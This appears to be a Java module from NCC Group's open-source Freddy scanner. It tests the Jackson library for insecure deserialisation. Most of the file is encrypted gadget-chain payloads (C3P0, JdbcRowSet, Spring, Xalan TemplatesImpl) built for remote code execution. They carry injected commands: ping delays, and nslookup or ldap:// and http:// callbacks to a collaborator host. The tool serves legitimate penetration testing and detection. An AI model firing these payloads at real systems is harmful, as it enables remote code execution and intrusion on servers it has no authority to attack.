// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java Jackson library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JacksonModule extends FreddyModuleBase {
    //Time-based payload delay
    private static final int TIME_DELAY = 18000;

    //C3P0RefDataSource payload data
    private final String C3P0REF_PREFIX = decrypt("ppW4GPVFqFqrnzKcAbKoGo1+UaDYgnZgJPhbblAaJHCifYJYQMcssbxDhzLByO6JhJzbFNnLcy4q/ZSENbvl0uUQDSdLJvvUqQt6azSACoE=");
    private final String C3P0REF_SUFFIX = decrypt("5kgbZ+PEVz96/+eSZUKC1LZD73xXDRRMTr0YcVz8qBI=");

    //C3P0WrapperConnPool payload data
    private final String C3P0WRAP_PREFIX = decrypt("ppW4GPVFqFqrnzKcAbKoGou1cHiyZ3HuAnooqFMW1y9SU2kSIOi21Cf2S3iLp94KN1HXfLEsaTEXPq06AaRz90yfsojI4PEacEUgaCLNMQvJ3Q/3bhWNAV1xVwryR7TwmCt5gNQ3ZpTEtcvGuepz54dkwqNaCZDzshAo4JEpuN6eomUt57+VB1ox5dKmMYwpfZ+V/woZydpKKbI4P2QVsntxCautzBFtDjUDV7wXjDnSAhSRfXp6jUpJabk9+ddwyVPmyRGoABluNIfpWc41x6MlqB3vekMClOIsRP6LDhdpp64OFqk8Hb0ZWNbaR30SgWGKAR4kEVKrMaAMLhJRkT++v+hcrM3BMInindfy3WRcINyfQ42QFh0LyjLeACFHeiPeMMQwilzSvpT7tYCyUJ39pSGJ88tvrPGC8ZOHKEaTZr/Mly9dk+x2oR0F7MM43GkEKaba5AanulkiafAuv1lOAxMROqs+lX+M5W3P9WxaQUvmlnUz12pKxIOgG8WibcHNHsXYDHlfxckvu3CyLR1hQ/D7/4xsI9Tp8EH7uSXn1EB1HeIBLjre8UKOAF2v8i0aWP2x+8zPx+GZ/FknMaYaGh695n0nIOjBVG1xAUZg1n4mw+vxmELIvBrvd+PBNwt1A6H+oUSsjKxdiKRlhb7eW8iBhYe8j4/x/It+Uv4U8/RTuyKLFeMHaT1ZOVG/4Qe923o7d3cD/GgmMedZnS7oWTnylO0KQcyZc3ga74VpyvjI6H4EKkUDCAvhbxuj80IZUKmnA8R+F+M4qk3SwhQou7SBOoEHOgtLIK1l2hPuztUamwXTR2WYRhXa+G6C2dBplqK5NUi4mB+21OP6LspVv5Ob4o/QfXfSxaJuF5KCPOCKl/tmxmFodIGkBkBO7a8Y3HAx6oSz6jqsibGany0R4RwAB72t3IqrwTBXTqYh1hbSQa9Vl5UGpY6ZzvNaJ5K5HvXOKDrxTMr/SGXhwU30ZHf2a90lbFizNO1yzRGwNMmNBEUBTjFkotjZQ/L4giGPAnxM6QzPua+x6UEl8ERHRYh/JZ3oUxEcJjdCGU2VOueR6eXu6PDxc/tiDArGy1BH9Rbq55NT+boYUP+S8GDK9kOra6jmwFRwsiiIzsWuiefxCRHvCfUi1xTj/vypMgktRLc7bwptPXjZMUw2vZnVPZunp6a66Mklhy/0fHVtkay8yBo48tfcIE22mtlh9H6CvrUOn7dWCqzsfPnJucNZC2qYXXaWAXgTUWRg9aSqdaKaWWnzPnylhvXFL/raxntL6sUo0zlkJCLG4P5JmV+qcAxJjsStn0YhDXyG3/ZxEJtqt2wFQTDYA4wge/YTO7oMkxUtA3wj5z+eJWjHuADT2BpWO8EjiBCKoow9BYJi0F9SBXxDl6i1NyS/n5UDIv2VMzUvLLAEtC0voW7r+6+ncDlTWfFddAGwQIquILarX8PbNalE1tpg9hosOX8ezENhiv+4C7AYsR4nEfZPCreNaBXYOh2p/mgl7ZAXP1XO0pS7E+GYSy57l6O5zQ/72E/JKWuA2jYdqDJYxTKaZw==");
    private final String C3P0WRAP_SUFFIX = decrypt("2crptr+xWN/59v+M8L0ZVeUQDSdLJvvUqQt6azSACoE=");

    //JdbcRowSet payload data
    private final String JDBC_PREFIX = decrypt("Cq8zV4pBMdejLBf0TGuC4dUFSrXT3yYOBHA2WUQBW04oOCUEXklxs98hKX6a4AvY4VeN9ERm5PfzQdk619khbg==");
    private final String JDBC_SUFFIX = decrypt("pwBpXblJD6AwjVhDoVO8+dSRLo9C2PsohsHUlSHkKk8=");

    //SpringAbstractBeanFactory payload data
    private final String SABF_PREFIX = decrypt("XoCp6tlRGk5STwCzDVmzaamntdpXGglRNWIP0Zm7tiNEB/374y3AN2RW0Ezgd7I/4COWwNHSe5nl8sgBMnXV0O9un85gL7EbtOzhshjq5uq5doq4iG7Z03zWHehhGVcI/TKgPzSBsayEflSVvNVqojo1blrSpz+NeyvRQtWdWZaO+C3yh9aS6s/qlsXL+ANJuVv55LrWC+Zz6V1jTH6N9ygd4EQ7FXSZq15jMXUvTw/K5OJqA97pAwFlkISd5ldT");
    private final String SABF_MIDDLE = decrypt("WA5mnmL7xoeocU81/Yzy8KU97t7NDDTagZJWgG3yF5U=");
    private final String SABF_SUFFIX = decrypt("j30IydLg4SWbmjXW0HRurHlVMzZ0z7FiYq5AYELB+mWO2HxAMUbvETlzJy4EAfTy/Sislj8EoGFZLPGocTfPhjtMfgURO3OJI+lFyOJPH3Q=");

    //SpringPropertyPathFactory data
    private final String SPPF_PREFIX = decrypt("lxQpXwJ4ZhCCSbtDw1U/4rOrrLH3wOomN2tj0R8yxXnDIdo8+k6UReTWgEskH921wErdtrJdl2f+g1Cg0mCBqzGQFyGcmJvzrxT1eaOYyxWlPe7ezQw02oGSVoBt8heV");
    private final String SPPF_MIDDLE = decrypt("XGgcrkgbHLDfqJvwRGSPaT6vcJYD5Ee4ZVacsLiFuOh1teVlScMbm9Y3wZQWK2amPOjQ4jTTlgJTXIOwnQqaRswdrlaGZJGYs+zReXelfQArQBIQNP1NVdOtG/J6Vw19jYhdebXXJzViT5wEQhVl7MzS13UTXPoU5P46dffbVjI=");
    private final String SPPF_SUFFIX = decrypt("t9jv95R7YJIWo7s2ZLJnMQ==");

    //Xalan TemplatesImpl payload data
    private final String TIMPL_PREFIX = decrypt("8mUSuakTr5/aOIrc96FA+jsZf4OS6Kf8AEG6DgZyrvCGz69Cwl4erE3XoqC74KfHcN/uBNf/uhVk29gzJMZa/5oKcyDq9ou2G0jqrR5lOJntJ5lR8PTmXM043Nf7itO9");
    private final String TIMPL_SUFFIX = decrypt("EH+cItqlfz6c2Uh5+DoleejtH0pCCrUEolaI0W767ZkFfez1Vp3UZjahV+hWw9iw");
    private final String TIMPL_INNER_PREFIX_B64 = decrypt("cJk31LGpvAcauF/nzEjyQAjuxpyDqVFxdBkJa14SonOz1FHrU60NRRbT/umIMmPhuioMAIJvLBIbBruF6ShbYi8Lv98j1AtHxcTlunFx5Cq3MW5jpSl7Y3A3jnD9SWqawkH6Q+ZPNUunSzkYtkwQSkWFBnOIuetJS2HuK/PUrBNidU7zenyoG3D9JDW8pTCLprfrBYaKAXrbHAB1k2zlhNeVRBT/KYmWTwwnc6Z0jN2NyJhP/A5btxz656NhUYv9tNXyZAUzhp7+uIt+i47VhSojdR2B2dxasmTic82ycRmxLPFCaY8eyvJNjLNs3Lw4IivqPRLVtz8Fy8IrDmReqU5MdR8JzS8OvwtcyBxQ1mDeUu3YCi4ikm6A590GqAdfMWrXFuVCoF1K512RLa1CgVhVHMASxlX7Ik9jbuXGsPOp18XvqBBqDPZP271yQg7Ufqf87rFdom7gekN/V21lXPpEJMdxZ9DHfxAcYOZJFgJsgqc5DmPxivqk2TnpOtMHaj/no1ewcCQqc//uum17HcNByErWzcxESPkDk4ZoycrrOzvorN7h1DrXOT9mGwpmBaLkE+b0zlnUd7LHlqDEmRZXcTaVvTelZbkgyeQ6iki1AcF+VAvThiq+evlC0FzlaRHGh+38lbtvnQZhkyVCvZ5/inau51QpTkLPFx3hBXqWcEm6NWfURIqvsRZdlsEq9abAwCVWA5tc3fhT45y9WOwiespdHS/TNofXCrdekS+JO2f4i1zUAw7FSN0zFoP912ioVgliGk2A095al2dq/+UQDSdLJvvUqQt6azSACoE=");
    private final String TIMPL_INNER_SUFFIX_B64 = decrypt("PeqpwchnARZ6H0k12DRautZnA+L9+CywF68RIv11Jj7NyAeBqhr0DEyeaHB4LZS9N6zz0wmb8MXow50/Sa7oaolufoPDoQABHH+Wf044fy+DEiho3jS+jXUhu65dnkVjNmSO5fc8sP2UCvU5cKanRdNLkf5ZlpkSnIr4zzHx6ZIAKxer95QcXsF+HDuPo8urOYggf3pUF+tokzaaosJuincwN7FbAVCF5BMumGji6xx2KcCzALaSb4KqK71h4o0P3hggI7cRFy5cWNeJyYpZ4OFs8B2bZazTBsmVGMvkBlbd4LP1sDbM7y361XYmRe4XcY2xwoxoosaIp+UTwQtr52Q3MJfOEW8QuUkTpcXwylJ3TwdrQw0yx1rKFRvP7R5lAqFQyO/gXf7AU5XeqlyUH0z4F0+pvCSuFPmMiqP+I/dsxBGk0CiBZu8j0tfByJ5Sm03JhaCtwgMYFvImNqJBlIR06rBIlmlBN2oIJrgPDzXO5ZB6eAJue7usgzsPfQrUK0kNe6DnLj7s8D3wdcckKPqHvfJDnLb/hoFPwrySDvpbGbWqq6jXje+YTMrWwLQ4sMrX5oicVZP9LNrbo4/DRE55+oYOSb0lYDsfNJtiJGjf3mZpGsH+QFd+lln8dpfu6i7DJE74NGsuE28JpXwGn/+bu7WQhJYug+v7OJWI590j+Q4mPoO++P8bFZMUsGJMFJ0p060O5/7MMne5kH5oR5MT3bpXH1xtsyZARtwMPNz3XyF1LPkD2ji5BsuvUdXjPROos4ub5KYDQmzu7i/Lbw==");
    private static final int TIMPL_PAYLOAD_CMD_OFFSET = 443;
    private byte[] TIMPL_INNER_PAYLOAD;

    protected void initialiseModule() {
        setName("Jackson");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        TIMPL_INNER_PAYLOAD = buildBinaryPayloadBuffer(TIMPL_INNER_PREFIX_B64, TIMPL_INNER_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("com\\.fasterxml\\.jackson\\."), Pattern.compile("exception", Pattern.CASE_INSENSITIVE)}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("[\"\"]", Pattern.compile("Invalid type id ((')|(&#39;))((')|(&#39;))"));

        registerActiveScanTimeBasedPayload(TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "cmd /c ping -n 21 127.0.0.1", false) + TIMPL_SUFFIX, TIME_DELAY);
        registerActiveScanTimeBasedPayload(TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "ping -c 21 127.0.0.1", false) + TIMPL_SUFFIX, TIME_DELAY);

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
        registerActiveScanCollaboratorPayload(PN_TEMPLATES, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + "ldap://" + hostname + "/" + SPPF_MIDDLE + "ldap://" + hostname + "/" + SPPF_SUFFIX;

            case PN_TEMPLATES:
                return TIMPL_PREFIX + generateBase64BinaryPayload(TIMPL_INNER_PAYLOAD, TIMPL_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + TIMPL_SUFFIX;
        }
        return null;
    }
}
